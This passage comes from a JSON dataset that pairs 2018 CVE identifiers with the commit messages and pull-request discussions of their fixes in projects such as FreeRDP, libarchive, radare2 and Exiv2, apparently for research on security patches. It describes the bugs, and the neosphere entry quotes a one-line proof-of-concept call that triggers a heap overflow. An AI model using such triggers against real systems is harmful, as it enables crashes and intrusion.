            "cve-id": "CVE-2018-8022",
            "commit_url": "https://github.com/apache/trafficserver/commit/79e057fa5cc42b4c7a6b689bf6cb638ac40d2ec5",
            "commit_msg": "Convert an ink_release_assert into logic to reset the rbio to use the remaining data.\n\nTidy up the fix and reduce cut-n-paste.",
            "commit_msg_words": 21,
            "other_info": "Convert an ink_release_assert into logic to reset the rbio to use the\u2026 Thought on this some more this morning.  Perhaps all we should do is replace the ink_release_assert with a ink_assert and fail the connection in this case.  I think if the assert is triggered, the client is behaving badly.  Of course we can try to stumble on (this code addition).  Perhaps that is ok too.  But at a minimum the ink_release_assert should be removed/replaced. Pushed an updated PR that gathers up some of the cut-n-paste rbio code.  I'm testing this on one of our systems. [approve ci autest] Testing on Docs / CI right now, once we land this on master (once reviewed), I can test on prod. It has been successfully running on my box today.  Of course that box was not seeing the release_assert before. Nice cleanup of all that cut and paste stuff.",
            "pr_title_words": 12,
            "comments_words": 135,
            "total_other_info_words": 147
        },
        {
            "cve-id": "CVE-2018-7262",
            "commit_url": "https://github.com/ceph/ceph/commit/7872a831783e17dcc4d0aa70cffc256afb664f7a",
            "commit_msg": "rgw:  make init env methods return an error\n\nSince web frontends may signal an error when requests are malformed or so, let\nus double check this and raise errors early. The current user of this is\ncivetweb frontend; which can potentially return null from `parse_http_headers`\nwhen a HTTP header without a \":\" is supplied at which point headers.value is\nnull which can lead to undefined behaviour later in RGW.\n\nFixes: http://tracker.ceph.com/issues/23039\nSigned-off-by: Abhishek Lekshmanan <abhishek@suse.com>",
            "commit_msg_words": 75,
            "other_info": "rgw:  make init env methods return an error changelog: \r\n- drop init_error variable in rgw_civetweb\r\n- raise -EINVAL if mg_request info isn't populated in rgw_civetweb.cc\r\n   this is a changed behaviour  from earlier where we return and fail at a much later stage in rgw process \r\n @yehudasa @cbodley do these changes look okay? was unable to reproduce the failures in manual testing :+1:",
            "pr_title_words": 8,
            "comments_words": 54,
            "total_other_info_words": 62
        },
        {
            "cve-id": "CVE-2018-1000852",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/baee520e3dd9be6511c45a14c5f5e77784de1471",
            "commit_msg": "Fix for #4866: Added additional length checks",
            "commit_msg_words": 7,
            "other_info": "Fix for #4866: Added additional length checks \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/3105/",
            "pr_title_words": 7,
            "comments_words": 14,
            "total_other_info_words": 21
        },
        {
            "cve-id": "CVE-2018-9009",
            "commit_url": "https://github.com/libming/libming/commit/1d698a4b1f03d6136bbf2b0171b86985be553454",
            "commit_msg": "decompile: fix use-after-free in decompileJUMP\n\nSame issue as f42fdb4 (functions accessing actions array without\nchecking the validity of n, the user entered index), same fix.\n\nIn this patch we also fix other source code places which might be\naffected by the same bug.\n\nFixes #131 (CVE-2018-9009).",
            "commit_msg_words": 46,
            "other_info": "decompile: fix various security issues (By the way, thanks for adding me to the group, but even if I have the permissions to merge now I still consider it essential to get an external review before getting any line of code into the master) Just noticed some NEWS entries are missing. Will be fixed soon. Do you want to include an entry for merged PR #138 since you're at it ? Thanks for the great work guys!\r\n\r\nwell.. i have some doubts, with the death of the flash, this library still be useful?\r\n\r\nin other words, AS3 is supported? @hlef how about fixing those NEWS entries so we merge this ?\r\n@Guardian820 Ming does not support AS3",
            "pr_title_words": 5,
            "comments_words": 112,
            "total_other_info_words": 117
        },
        {
            "cve-id": "CVE-2018-20845",
            "commit_url": "https://github.com/uclouvain/openjpeg/commit/c5bd64ea146162967c29bd2af0cbb845ba3eaaaf",
            "commit_msg": "[MJ2] To avoid divisions by zero / undefined behaviour on shift\n\nSigned-off-by: Young_X <YangX92@hotmail.com>",
            "commit_msg_words": 14,
            "other_info": "Fix multiple potential vulnerabilities and bugs Ping > @Young-X I had to revert that commit in e1740e7 since it didn't compile. I'm disappointed you submit commits that don't even compile...\r\n\r\n@rouault it seems commit https://github.com/uclouvain/openjpeg/commit/e1740e7ce79d0a1676db4da0f4189b64e85f52cb was supposed to fix CVE-2018-20846, which is about out-of-bound accesses in pi_next_lrcp, pi_next_rlcp, pi_next_rpcl, pi_next_pcrl, pi_next_rpcl, and pi_next_cprl . With that commit reverted, is there a patch for that CVE? Thanks. > is there a patch for that CVE?\r\n\r\nno",
            "pr_title_words": 6,
            "comments_words": 69,
            "total_other_info_words": 75
        },
        {
            "cve-id": "CVE-2018-1000879",
            "commit_url": "https://github.com/libarchive/libarchive/commit/15bf44fd2c1ad0e3fd87048b3fcc90c4dcff1175",
            "commit_msg": "Skip 0-length ACL fields\n\nCurrently, it is possible to create an archive that crashes bsdtar\nwith a malformed ACL:\n\nProgram received signal SIGSEGV, Segmentation fault.\narchive_acl_from_text_l (acl=<optimised out>, text=0x7e2e92 \"\", want_type=<optimised out>, sc=<optimised out>) at libarchive/archive_acl.c:1726\n1726\t\t\t\tswitch (*s) {\n(gdb) p n\n$1 = 1\n(gdb) p field[n]\n$2 = {start = 0x0, end = 0x0}\n\nStop this by checking that the length is not zero before beginning\nthe switch statement.\n\nI am pretty sure this is the bug mentioned in the qsym paper [1],\nand I was able to replicate it with a qsym + AFL + afl-rb setup.\n\n[1] https://www.usenix.org/conference/usenixsecurity18/presentation/yun",
            "commit_msg_words": 103,
            "other_info": "Fix various crash, memory corruption and infinite loop conditions There are some test cases at https://bugs.launchpad.net/ubuntu/+source/libarchive/+bug/1794909\r\n\r\n I have requested CVEs for these issues through the Distributed Weakness Filing project. In case someone else is looking for the CVEs, it looks like the assignments are :\r\n- CVE-2018-1000877 for https://github.com/libarchive/libarchive/commit/021efa522ad729ff0f5806c4ce53e4a6cc1daa31\r\n- CVE-2018-1000878 for https://github.com/libarchive/libarchive/commit/bfcfe6f04ed20db2504db8a254d1f40a1d84eb28\r\n- CVE-2018-1000879 for https://github.com/libarchive/libarchive/commit/15bf44fd2c1ad0e3fd87048b3fcc90c4dcff1175\r\n- CVE-2018-1000880 for https://github.com/libarchive/libarchive/commit/9c84b7426660c09c18cc349f6d70b5f8168b5680",
            "pr_title_words": 9,
            "comments_words": 52,
            "total_other_info_words": 61
        },
        {
            "cve-id": "CVE-2018-15834",
            "commit_url": "https://github.com/radareorg/radare2/commit/ee1727f272d69d904cc84e4d368ece8c260f5ead",
            "commit_msg": "fix #11274 attempt.\n\nbasically with the given name function section size\nwas way above, we consider as faulty even though\nthe sample sig file seems legit ?",
            "commit_msg_words": 27,
            "other_info": "fix #11274 attempt. this was assigned the CVE ID: `CVE-2018-15834`",
            "pr_title_words": 3,
            "comments_words": 7,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2018-1000524",
            "commit_url": "https://github.com/spheredev/neosphere/commit/252c1ca184cb38e1acb917aa0e451c5f08519996",
            "commit_msg": "Fix integer overflow in layer_resize in map_engine.c (#268)\n\n* Fix integer overflow in layer_resize in map_engine.c\r\n\r\nThere's a buffer overflow bug in the function layer_resize. It allocates\r\na buffer `tilemap` with size `x_size * y_size * sizeof(struct map_tile)`.\r\nBut it didn't check for integer overflow, so if x_size and y_size are\r\nvery large, it's possible that the buffer size is smaller than needed,\r\ncausing a buffer overflow later.\r\n\r\nPoC: `SetLayerSize(0, 0x7FFFFFFF, 0x7FFFFFFF);`\r\n\r\n* move malloc to a separate line",
            "commit_msg_words": 79,
            "other_info": "Fix integer overflow in layer_resize in map_engine.c There are probably more where this came from; I am admittedly pretty lazy about internal sanity checks.  Buffer overflows triggerable from script are no joke though, so thanks for fixing this. :+1: 5.2.10 has been released containing this fix.  The buffer overflow described in this pull was in fact exploitable: all it requires is to make the engine load a specially-crafted map which calls SetLayerSize in its entry script to trigger the buffer overrun.\r\n\r\nI do note that by default, the engine is heavily sandboxed: games can only load their own bundled assets (which are trusted by definition).  However, it *is* possible to enable a `relaxed` mode for the sandbox which allows loading anything on the file system using an absolute path.\r\n\r\nSo this is indeed a security flaw.  The fix will therefore be backported to 5.0 and 5.1 as well. @fatcerberus Thanks for releasing the fix! Would you mind me applying for a CVE ID for this vulnerability? Sure.  I admittedly don\u2019t know how that whole process works so if you want to do it that\u2019s fine by me. :smiley:\r\n\r\nminiSphere 5.0.3, 5.1.5, and 5.2.10 all contain this fix. Great! Actually the CVE ID can be obtained by filing a request on https://iwantacve.org. It can be done by either bug finder or project maintainer, so yes I just did it myself. I have a habit of collecting CVEs, so that's why I want to get one for this bug.\r\n\r\nAnd thank you again for the version info! \ud83d\udc4d  [CVE-2018-1000524](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000524) was assigned to this issue.",
            "pr_title_words": 7,
            "comments_words": 255,
            "total_other_info_words": 262
        },
        {
            "cve-id": "CVE-2018-7868",
            "commit_url": "https://github.com/libming/libming/commit/3a000c7b6fe978dd9925266bb6847709e06dbaa3",
            "commit_msg": "Fix heap-buffer-overflows when accessing pool\n\nConstants are usually retrieved from the constant pool without verifying\nthat the pool actually contains them, which may lead to various heap\nbuffer overflow issues.\n\nIn this patch we add a counter keeping track of how many elements the pool\ncontains, and checks making sure that whenever the pool is accessed, the\nconstant in present in the pool (constant position < pool counter).\n\nAlso, do not return \"\" when a pointer is excepted (it should be legal to free\nthis return value).\n\nThis patch fixes #112 (CVE-2018-7875), fixes #120 (CVE-2018-7871),\nfixes #117 (CVE-2018-7870), fixes #114 (CVE-2018-7872), fixes #122,\nfixes #113 (CVE-2018-7868), fixes #123.",
            "commit_msg_words": 108,
            "other_info": "Fix various issues with pool management / access Thanks, always great contributions !",
            "pr_title_words": 8,
            "comments_words": 5,
            "total_other_info_words": 13
        },
        {
            "cve-id": "CVE-2018-10888",
            "commit_url": "https://github.com/libgit2/libgit2/commit/9844d38bed10e9ff17174434b3421b227ae710f3",
            "commit_msg": "delta: fix out-of-bounds read of delta\n\nWhen computing the offset and length of the delta base, we repeatedly\nincrement the `delta` pointer without checking whether we have advanced\npast its end already, which can thus result in an out-of-bounds read.\nFix this by repeatedly checking whether we have reached the end. Add a\ntest which would cause Valgrind to produce an error.\n\nReported-by: Riccardo Schirone <rschiron@redhat.com>\nTest-provided-by: Riccardo Schirone <rschiron@redhat.com>",
            "commit_msg_words": 70,
            "other_info": "Release v0.27.3",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2018-20457",
            "commit_url": "https://github.com/radareorg/radare2/commit/e5c14c167b0dcf0a53d76bd50bacbbcc0dfc1ae7",
            "commit_msg": "Fix #12417/#12418 (arm assembler heap overflows)",
            "commit_msg_words": 6,
            "other_info": "Fix #12417/#12418 attempts. # [Codecov](https://codecov.io/gh/radare/radare2/pull/12442?src=pr&el=h1) Report\n> Merging [#12442](https://codecov.io/gh/radare/radare2/pull/12442?src=pr&el=desc) into [master](https://codecov.io/gh/radare/radare2/commit/db18c7845698fc99357a840f11c6d9d2187a4372?src=pr&el=desc) will **decrease** coverage by `<.01%`.\n> The diff coverage is `100%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/radare/radare2/pull/12442/graphs/tree.svg?width=650&token=ATuAGonwJ9&height=150&src=pr)](https://codecov.io/gh/radare/radare2/pull/12442?src=pr&el=tree)\n\n```diff\n@@            Coverage Diff             @@\n##           master   #12442      +/-   ##\n==========================================\n- Coverage   36.92%   36.92%   -0.01%     \n==========================================\n  Files         906      906              \n  Lines      289947   289947              \n==========================================\n- Hits       107063   107062       -1     \n- Misses     182884   182885       +1\n```\n\n\n| [Impacted Files](https://codecov.io/gh/radare/radare2/pull/12442?src=pr&el=tree) | Coverage \u0394 | |\n|---|---|---|\n| [libr/asm/arch/arm/armass64.c](https://codecov.io/gh/radare/radare2/pull/12442/diff?src=pr&el=tree#diff-bGlici9hc20vYXJjaC9hcm0vYXJtYXNzNjQuYw==) | `75.26% <100%> (\u00f8)` | :arrow_up: |\n| [libr/asm/arch/arm/armass.c](https://codecov.io/gh/radare/radare2/pull/12442/diff?src=pr&el=tree#diff-bGlici9hc20vYXJjaC9hcm0vYXJtYXNzLmM=) | `82.79% <100%> (\u00f8)` | :arrow_up: |\n| [libr/util/sys.c](https://codecov.io/gh/radare/radare2/pull/12442/diff?src=pr&el=tree#diff-bGlici91dGlsL3N5cy5j) | `56.44% <0%> (-0.29%)` | :arrow_down: |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/radare/radare2/pull/12442?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/radare/radare2/pull/12442?src=pr&el=footer). Last update [db18c78...88a8adf](https://codecov.io/gh/radare/radare2/pull/12442?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).",
            "pr_title_words": 3,
            "comments_words": 135,
            "total_other_info_words": 138
        },
        {
            "cve-id": "CVE-2018-10205",
            "commit_url": "https://github.com/hyperhq/hyperstart/commit/bde26da80122117cce5cea65e1d51129fc5a7e3c",
            "commit_msg": "hyperstart: fix several mem leak\n\nSigned-off-by: y00316549 <yangshukui@huawei.com>",
            "commit_msg_words": 8,
            "other_info": "hyperstart: fix several mem leak looks the portmapping case failed, right? Can one of the admins verify this patch? ok to test, hykins Can one of the admins verify this patch? memory leak call trace:\r\nhyper_ctlmsg_handle--->hyper_new_container--->hyper_setup_container--->hyper_setup_container_rootfs--->container_setup_modules\r\nand \r\nhyper_ctlmsg_handle--->hyper_new_container--->hyper_setup_container--->container_prepare_rootfs_dev--->hyper_rescan_scsi\r\neach new container leak memory in pod, vm's memory will exhaust\r\nping @laijs\r\n retest this please, @hykins LGTM, thanks! Can someone (@keloyang, @bergwolf) confirm this is exploitable to conduct a DoS? I ask because CVE-2018-10205 was assigned to this issue, but there is no indication it is a vulnerability. Thanks! @attritionorg No, I don't think one can use the issue to create a DoS. For one thing, it only affects one VM. For another thing, it only happens once per VM to set up the kernel modules, and once per new container to scan the scsi bus. @bergwolf thanks for clarifying!",
            "pr_title_words": 5,
            "comments_words": 134,
            "total_other_info_words": 139
        },
        {
            "cve-id": "CVE-2018-16790",
            "commit_url": "https://github.com/mongodb/mongo-c-driver/commit/0d9a4d98bfdf4acd2c0138d4aaeb4e2e0934bd84",
            "commit_msg": "Fix for CVE-2018-16790 -- Verify bounds before binary length read.\n\nAs reported here: https://jira.mongodb.org/browse/CDRIVER-2819,\na heap overread occurs due a failure to correctly verify data\nbounds.\n\nIn the original check, len - o returns the data left including the\nsizeof(l) we just read. Instead, the comparison should check\nagainst the data left NOT including the binary int32, i.e. just\nsubtype (byte*) instead of int32 subtype (byte*).\n\nAdded in test for corrupted BSON example.",
            "commit_msg_words": 73,
            "other_info": "Fix for CVE-2018-16790 -- Verify bounds before binary length read. Terrific, thank you. Would you please add the corrupt BSON data as a file in src/libbson/tests/binary and add a test like this one?:\r\n\r\nhttps://github.com/mongodb/mongo-c-driver/blob/b3bdc57c2009eb918857bd9657bb8bf953a6840b/src/libbson/tests/test-bson.c#L1247 Yep, I'll see if I can get that integrated next week. Added corrupt BSON example. Let me know if that wasn't what you were looking for. Thanks very much!",
            "pr_title_words": 10,
            "comments_words": 53,
            "total_other_info_words": 63
        },
        {
            "cve-id": "CVE-2018-12436",
            "commit_url": "https://github.com/wolfSSL/wolfssl/commit/9b9568d500f31f964af26ba8d01e542e1f27e5ca",
            "commit_msg": "Change ECDSA signing to use blinding.",
            "commit_msg_words": 6,
            "other_info": "Change ECDSA signing to use blinding.",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2018-1000618",
            "commit_url": "https://github.com/EOSIO/eos/commit/cf7209e703e6d3f7a5413e0cb1fe88a4d8e4b38d",
            "commit_msg": "Add limit to recursion",
            "commit_msg_words": 4,
            "other_info": "Pretty print transactions @heifner My issue is still there. [issue#4111](https://github.com/EOSIO/eos/issues/4111)\r\nThis is the error I'm getting:\r\nInvalid packed transaction\r\npivot != std::string::npos: No delimiter in string, cannot determine type: EOSK59ovuuemzcGX1QKATF4pEVg2AmUT2rjQAH8MrC52SpmBZ59YPVYMFYTBg7XNgCDQcX18vMyDsjEp4SbyDnkcUvruZ94BX\r\nFailed to deserialize variant This is the command I'm using and getting error:\r\ncleos -H node1.eosphere.io --wallet-host localhost --wallet-port 8888 set contract eosuser build/contracts/eosio.token -p eosuser\r\n\r\nGetting same error for every contract\r\n\r\ncleos version client: 15953cc1\r\n\r\nPlease, help me to fix this.\r\nThanks @heifner The problem is coming from here /eos/libraries/fc/src/crypto/signature.cpp:\r\n const auto pivot = base58str.find('_');\r\n      FC_ASSERT(pivot != std::string::npos, \"No delimiter in string, cannot determine type: ${str}\", (\"str\", base58str));",
            "pr_title_words": 3,
            "comments_words": 96,
            "total_other_info_words": 99
        },
        {
            "cve-id": "CVE-2018-16981",
            "commit_url": "https://github.com/nothings/stb/commit/6570d6a825e2982a4f1c9ae7173a737eed4dd6f0",
            "commit_msg": "stb_image: Make GIF reader validate image size.\n\nI must've missed it when I did this for the other image loaders.\nEither way, combined with the previous checkin, this should fix\nissue #614 properly.\n\nFixes issue #614.",
            "commit_msg_words": 36,
            "other_info": "stb_image: Fix multiple bugs in GIF decoder.",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2018-8785",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/602f4a2e14b41703b5f431de3154cd46a5750a2d",
            "commit_msg": "Fixed CVE-2018-8785\n\nThanks to Eyal Itkin from Check Point Software Technologies.",
            "commit_msg_words": 11,
            "other_info": "Cve fixes \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/3393/",
            "pr_title_words": 2,
            "comments_words": 14,
            "total_other_info_words": 16
        },
        {
            "cve-id": "CVE-2018-13139",
            "commit_url": "https://github.com/libsndfile/libsndfile/commit/df18323c622b54221ee7ace74b177cdcccc152d7",
            "commit_msg": "Check MAX_CHANNELS in sndfile-deinterleave\n\nAllocated buffer has space for only 16 channels. Verify that input file\nmeets this limit.\n\nFixes #397",
            "commit_msg_words": 21,
            "other_info": "Check MAX_CHANNELS in sndfile-deinterleave Tested with the posted `poc` file and this does indeed prevent the crash. Thanks!",
            "pr_title_words": 4,
            "comments_words": 14,
            "total_other_info_words": 18
        },
        {
            "cve-id": "CVE-2018-10186",
            "commit_url": "https://github.com/radareorg/radare2/commit/a0348bb1b512ef27301dd7cdfb327ef5e14813fc",
            "commit_msg": "Fix #9915 - crash in r_hex_bin2str from asm.c (#9922)",
            "commit_msg_words": 9,
            "other_info": "Fix #9915 - crash in r_hex_bin2str from asm.c",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2018-19661",
            "commit_url": "https://github.com/libsndfile/libsndfile/commit/c4dd30d69b070a3cb32b4bf74c47a8163b1916da",
            "commit_msg": "a/ulaw: fix multiple buffer overflows\n\ni2ulaw_array() and i2alaw_array() fail to handle ptr [count] = INT_MIN\nproperly, leading to buffer underflow. INT_MIN is a special value\nsince - INT_MIN cannot be represented as int.\n\nIn this case round - INT_MIN to INT_MAX and proceed as usual.\n\nf2ulaw_array() and f2alaw_array() fail to handle ptr [count] = NaN\nproperly, leading to null pointer dereference.\n\nIn this case, arbitrarily set the buffer value to 0.\n\nThis commit fixes #429 (CVE-2018-19661 and CVE-2018-19662) and\nfixes #344 (CVE-2017-17456 and CVE-2017-17457).",
            "commit_msg_words": 84,
            "other_info": "a/ulaw: fix multiple buffer overflows Oh, I just realized that #344 is very similar (identical ?) to #317. If PR #325 is merged then the dirty isnan() part of this patch can be removed.\r\n\r\n**Edit:** Ok, looks like #325 is not the best solution. I agree that checks in the library would be better.\r\n\r\nSome additional comments:\r\n\r\nAFAIK the only loop going through potentially NaN/invalid data in the library is located in the a/ulaw_array functions. Unless we add checks earlier, the fix should be there right ?\r\n\r\nNow I see two solutions: either we handle the error in the a/ulaw_array functions or we add a return value to them, return error code and let caller handle it. I chose the first solution in my patch.\r\n\r\nConcerning the error handling, we can either refuse to process the file and exit or provide some arbitrary value to fill the hole and continue. I chose the second solution in my patch.\r\n\r\nIn any case the error should be logged. This has to be fixed in my patch in any case but apart from adding a new psf argument to a/ulaw_array functions I don't know the proper way to do it. Thanks!",
            "pr_title_words": 5,
            "comments_words": 193,
            "total_other_info_words": 198
        },
        {
            "cve-id": "CVE-2018-20595",
            "commit_url": "https://github.com/hs-web/hsweb-framework/commit/40929e9b0d336a26281a5ed2e0e721d54dd8d2f2",
            "commit_msg": "fix #107 csrf",
            "commit_msg_words": 3,
            "other_info": "3.0.x",
            "pr_title_words": 1,
            "comments_words": 0,
            "total_other_info_words": 1
        },
        {
            "cve-id": "CVE-2018-4868",
            "commit_url": "https://github.com/Exiv2/exiv2/commit/fcb42570519f8cf924b0302b09062a60aa565fbe",
            "commit_msg": "Add check for DataBuf.size_ in Jp2Image::readMetadata()\n\nWhen parsing a subBox that is a ColorHeader, a length is extracted\nfrom the input file and fed directly into DataBuf() (which calls\nmalloc). A crafted input file can provide arbitrarily (up to\nmax(uint32_t)-8) large values and result in excessive memory\nallocation.\n\nThis commit adds a check for the new size of DataBuf so that it is not\nlarger than the remaining size of the file.\n\nThis fixes #202 aka CVE-2018-4868",
            "commit_msg_words": 77,
            "other_info": "Fix CVE-2018-4868 Please do not use the update branch button, it results in an extremely messy history when a PR exits for a longer time (especially if you press the button multiple times). It is harder to cherry-pick commits in a non-linear history and is a burden for package maintainers who have to backport patches.\r\n\r\nThe contribution guide mentions that we should instead rebase the changes on top of master before merging them, that way the commit history stays linear. I have just done that & we can merge this once travis is green again. Sorry if I sounded a little harsh, I was typing that in a hurry. \r\n\r\nThanks for your review :) So many hidden rules in GitHub.  Well they might be in a documentation, however I can't understand the documentation!  We'll get there with many things.  You'll see.\r\n\r\nIncidentally, I will do everything that I can to avoid changing test/data/bugfixes-test.out and going to run `$ cd tests ; python3 runner.py` from test/Makefile.  I don't think we need to rewrite test/bugfixes-test.out at the moment.  For new tests, I'll try to add them to the \"new\" test harness.  If I'm unable to do that, I'll add a simple bash script for the moment on a case-by-case basis.  For sure, I don't know how to test #223 using the new test harness and that's what I'd like to discuss with you 1-to-1. The rebase stuff is our \"rule\" and not from github, it's point `5.` in [CONTRIBUTING.md](https://github.com/Exiv2/exiv2/blob/master/CONTRIBUTING.md) Dan:  I've written my test for #223 in bash and it fetches binary images using curl from the buildserver.\r\n\r\nSure, I want to write it using your python test harness.  I tried to do this during the week and didn't know how to get the job done.  Of course, I can read all your python code and figure it out - however I would prefer to discuss it with you 1-to-1.   Or, if you prefer, I can document my puzzles and you can answer them for me.   Here's the current version of my bash script:\r\n```\r\n#!/bin/bash\r\n\r\nsource ./functions.source\r\ncd \"$testdir\"\r\n\r\nmkdir -p reference\r\nthis=$(basename $0)\r\nreference=reference\r\noutput=$this.out\r\n\r\n##\r\n# Reference output\r\ncat > $reference/$output <<END_OF_FILE\r\nExif.Fujifilm.Color                          Short       1  Monochrome\r\nExif.Fujifilm.Color                          Short       1  Sepia\r\nExif.Fujifilm.Color                          Short       1  Monochrome+G Filter\r\nExif.Fujifilm.Color                          Short       1  Monochrome+R Filter\r\nExif.Fujifilm.Color                          Short       1  Monochrome+Ye Filter\r\nEND_OF_FILE\r\n\r\n##\r\n# run the tests\r\nrm -rf $output\r\nfor testfile in 223-Monochrome.jpg 223-Sepia.jpg \\\r\n                223-Monochrome+G.jpg 223-Monochrome+R.jpg 223-Monochrome+Y.jpg ; do\r\n\tif [ ! -e $reference/$testfile ]; then (\r\n\t   cd   $reference\r\n\t   curl --silent -O http://exiv2.dyndns.org:8080/userContent/testfiles/223/$testfile\r\n\t) fi\r\n\trunTest exiv2 -pa --grep Fujifilm.Color $reference/$testfile >>$output\r\ndone\r\n\r\n##\r\n# report result\r\ncat $output | tr -d $'\\r' > $output.stripped\r\nmv  $output.stripped $output\r\necho -n \"$this \" ; reportTest   $output $reference/$output\r\n\r\n# That's all Folks!\r\n##\r\n``` I think we really shouldn't be pulling in data over the internet during\ntests, as that makes the tests depend on a functioning internet\nconnection or silently fail.\n\nImho we should consider Luis' suggestion from a few weeks ago to create\na new repository for testfiles for exiv2 that manages them via git\nlfs. You'll essentially get the same, the files are stored on a\nwebserver and do not blow up the repo size, but it all still looks like\ngit. We could then embed that repository via a git submodule.\n\nConcerning your actual problem, this will involve some additional work,\nas the test suite was not intended to download files. Could you take a\nlook at tests/doc.md? That should cover everything that the test suite\ncan do. This would be especially helpful for me, as I could find out\nwhere the documentation is lacking & improve it.\n\nI'll take a look how to pull in the test files, shouldn't be that hard\nwith Python's urllib.\n\nRobin Mills <notifications@github.com> writes:\n\n> Dan:  I've written my test for #223 in bash and it fetches binary images using curl from the buildserver.\n>\n> Sure, I want to write it using your python test harness.  I tried to do this during the week and didn't know how to get the job done.  Of course, I can read all your python code and figure it out - however I would prefer to discuss it with you 1-to-1.   Or, if you prefer, I can document my puzzles and you can answer them for me.   Here's the current version of my bash script:\n> ```\n> #!/bin/bash\n>\n> source ./functions.source\n> cd \"$testdir\"\n>\n> mkdir -p reference\n> this=$(basename $0)\n> reference=reference\n> output=$this.out\n>\n> ##\n> # Reference output\n> cat > $reference/$output <<END_OF_FILE\n> Exif.Fujifilm.Color                          Short       1  Monochrome\n> Exif.Fujifilm.Color                          Short       1  Sepia\n> Exif.Fujifilm.Color                          Short       1  Monochrome+G Filter\n> Exif.Fujifilm.Color                          Short       1  Monochrome+R Filter\n> Exif.Fujifilm.Color                          Short       1  Monochrome+Ye Filter\n> END_OF_FILE\n>\n> ##\n> # run the tests\n> rm -rf $output\n> for testfile in 223-Monochrome.jpg 223-Sepia.jpg \\\n>                 223-Monochrome+G.jpg 223-Monochrome+R.jpg 223-Monochrome+Y.jpg ; do\n> \tif [ ! -e $reference/$testfile ]; then (\n> \t   cd   $reference\n> \t   curl --silent -O http://exiv2.dyndns.org:8080/userContent/testfiles/223/$testfile\n> \t) fi\n> \trunTest exiv2 -pa --grep Fujifilm.Color $reference/$testfile >>$output\n> done\n>\n> ##\n> # report result\n> cat $output | tr -d $'\\r' > $output.stripped\n> mv  $output.stripped $output\n> echo -n \"$this \" ; reportTest   $output $reference/$output\n>\n> # That's all Folks!\n> ##\n> ```\n>\n> -- \n> You are receiving this because you modified the open/close state.\n> Reply to this email directly or view it on GitHub:\n> https://github.com/Exiv2/exiv2/pull/207#issuecomment-362834442\n Thanks, Dan.  I used svn to store test files for video and eps.  Git?  Sure, why not.  Because of my lack of skill with git, you'll understand why I haven't adopted that solution in this script. \r\n\r\nHowever both the \"new\" test harness and my efforts here use the concept of storing the \"reference output\" in the script and not in an external monolith such as test/data/bugfixes-test.out.\r\n\r\nThe puzzle isn't how to get the file (with curl/svn/git/urllib), the puzzle is that I haven't discovered how to run the test on multiple files and how to represent the \"reference output\".   For me, another important object is to be able to run a single script (rather than a collection such as test/bugfixes-text.sh).\r\n\r\nSo, we are in strong agreement about the direction and I'm asking for a little assistance to get onto our agreed/chosen road.  Robin Mills <notifications@github.com> writes:\n\n> Thanks, Dan.  I used svn to store test files for video and eps.  Git?  Sure, why not.  Because of my lack of skill with git, you'll understand why I haven't adopted that solution in this script. \n>\nSure, no problem. Creating another repository for that is also a little\nbit more work.\n\nI'll put this on my todo list.\n\n> However both the \"new\" test harness and my efforts here use the concept of storing the \"reference output\" in the script and not in an external monolith such as test/data/bugfixes-test.out.\n>\n> The puzzle isn't how to get the file (with curl/svn/git/urllib), the puzzle is that I haven't discovered how to run the test on multiple files and how to represent the \"reference output\".   For me, another important object is to be able to run a single script (rather than a collection such as test/bugfixes-text.sh).\n>\n\nTake a look at tests/bugfixes/github/test_issue_20.py\n\nTo run exiv2 multiple times, you just have provide the test suite with a\nlist of commands to run (and of course a list of stdout, stderr and\nreturn values).\n\nTo download your files, you have to write a custom setUp() function\n(that is the standard pre-test function in python's unittest framework)\nand a tearDown() that will delete them again. But this might be a little\ntricky for the start, so we can discuss that on slack.\n\n> So, we are in strong agreement about the direction and I'm asking for a little assistance to get onto our agreed/chosen road. \n>\n> -- \n> You are receiving this because you modified the open/close state.\n> Reply to this email directly or view it on GitHub:\n> https://github.com/Exiv2/exiv2/pull/207#issuecomment-362993388\n Thanks for those pointers.\r\n\r\nIt's a dry cold frosty sunny morning (1\u2103) in England so I'm going out to run and will investigate your suggestions after lunch.  I don't want to delete downloaded test images as they will never change.  It's the script (and reference output) that may change and will be checked in with the code.\r\n\r\nI hope things are good with you at work.  Thank You for all the effort you are putting into Exiv2.",
            "pr_title_words": 2,
            "comments_words": 1412,
            "total_other_info_words": 1414
        },
        {
            "cve-id": "CVE-2018-19842",
            "commit_url": "https://github.com/radareorg/radare2/commit/66191f780863ea8c66ace4040d0d04a8842e8432",
            "commit_msg": "Fix #12239 - crash in the x86.nz assembler ##asm (#12252)",
            "commit_msg_words": 10,
            "other_info": "Fix crash in the x86.nz assembler ##asm",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2018-14016",
            "commit_url": "https://github.com/radareorg/radare2/commit/eb7deb281df54771fb8ecf5890dc325a7d22d3e2",
            "commit_msg": "Fix #10464 - oobread crash in mdmp (#10683)",
            "commit_msg_words": 8,
            "other_info": "Fix #10464 - oobread crash in mdmp",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2018-19115",
            "commit_url": "https://github.com/acassen/keepalived/commit/f28015671a4b04785859d1b4b1327b367b6a10e9",
